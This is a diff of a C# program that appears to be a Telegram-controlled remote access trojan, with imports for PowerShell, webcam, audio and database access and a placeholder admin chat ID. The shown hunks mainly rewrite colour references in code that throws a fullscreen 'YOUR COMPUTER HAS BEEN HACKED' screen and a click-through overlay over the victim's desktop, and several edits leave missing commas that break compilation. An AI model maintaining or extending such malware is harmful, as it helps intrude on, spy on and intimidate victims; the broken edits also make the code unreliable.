@@ -12,9 +12,7 @@ using Telegram.Bot.Types;
 using Telegram.Bot.Types.Enums;
 using Telegram.Bot.Types.ReplyMarkups;
 using System.Management.Automation;
-using Telegram.Bot.Types.InputFiles;
 using Accord.Video;
-using NAudio.CoreAudioApi;
 using Accord.Video.DirectShow;
 using Accord.Video.FFMPEG;
 using System.Collections.Generic;
@@ -24,19 +22,15 @@ using System.Text;
 using System.Net.NetworkInformation;
 using System.Management;
 using System.Net;
-using System.Windows.Forms;
 using System.Drawing.Imaging;
 using NAudio.Wave;
 using System.Data.SQLite;
-using LibVLCSharp.WinForms;
-using System.Runtime.InteropServices.ComTypes;
 using System.Net.Mail;
 using System.DirectoryServices;
 using System.Text.RegularExpressions;
 using System.Net.Http;
 using Newtonsoft.Json;
 using Accord.Controls;
-using Accord.Video.FFMPEG;
 using System.Xml.Linq;
 using WMPLib;
 using LibVLCSharp.Shared;
@@ -1568,14 +1562,14 @@ static long adminChatId = {{ADMIN_ID}};
                 FormBorderStyle = FormBorderStyle.None,
                 WindowState = FormWindowState.Maximized,
                 TopMost = true,
-                BackColor = Color.Red
+                BackColor = System.Drawing.Color.Red
             };
 
             Label label = new Label()
             {
                 Text = "YOUR COMPUTER HAS BEEN HACKED",
                 Font = new Font("Arial", 40, FontStyle.Bold),
-                ForeColor = Color.White,
+                ForeColor = System.Drawing.Color.White
                 Dock = DockStyle.Fill,
                 TextAlign = ContentAlignment.MiddleCenter
             };
@@ -1745,8 +1739,8 @@ static long adminChatId = {{ADMIN_ID}};
                         WindowState = FormWindowState.Maximized,
                         TopMost = true,
                         ShowInTaskbar = false,
-                        BackColor = Color.Black,
-                        TransparencyKey = Color.Black,
+                        BackColor = System.Drawing.Color.Black
+TransparencyKey = System.Drawing.Color.Black
                         Opacity = 0.99
                     };
 
@@ -1820,10 +1814,16 @@ static long adminChatId = {{ADMIN_ID}};
         SetWindowLong(handle, GWL_EXSTYLE, style | WS_EX_TRANSPARENT | WS_EX_LAYERED);
     }
 
-    private static Color GetRandomPixelColor(Random rnd)
-    {
-        var colors = new[] { Color.Red, Color.Green, Color.Blue, Color.White, Color.Black };
-        return colors[rnd.Next(colors.Length)];
+    private static System.Drawing.Color GetRandomPixelColor(Random rnd)
+{
+    var colors = new[] { 
+        System.Drawing.Color.Red, 
+        System.Drawing.Color.Green, 
+        System.Drawing.Color.Blue, 
+        System.Drawing.Color.White, 
+        System.Drawing.Color.Black 
+    };
+    return colors[rnd.Next(colors.Length)];
     }
 
     private static void SetWindowToolWindow(IntPtr handle)
